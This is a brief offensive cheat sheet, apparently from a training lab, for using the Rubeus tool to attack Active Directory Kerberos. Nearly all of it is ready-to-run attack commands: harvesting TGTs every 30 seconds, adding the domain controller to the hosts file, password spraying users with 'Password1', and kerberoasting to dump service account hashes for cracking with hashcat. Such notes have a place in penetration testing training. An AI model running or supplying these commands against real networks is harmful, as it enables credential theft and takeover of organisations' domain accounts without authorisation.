Used to attack Kerberos.

`https://github.com/GhostPack/Rubeus`

---

### Harvest for TGTs every 30 seconds
`Rubeus.exe harvest /interval:30`

---

### Bruteforcing and Password Spraying

add the DC domain name to windows host file
```
echo 10.10.53.4 CONTROLLER.local >> C:\Windows\System32\drivers\etc\hosts
```


password spray against found users with given password
```
Rubeus.exe brute /password:Password1 /noticket
```

---

### kerberoasting

Dump Kerberos hash of any kerberoastable users
```
Rubeus.exe kerberoast
```

place hash in txt file on attack machine and crack with hashcat

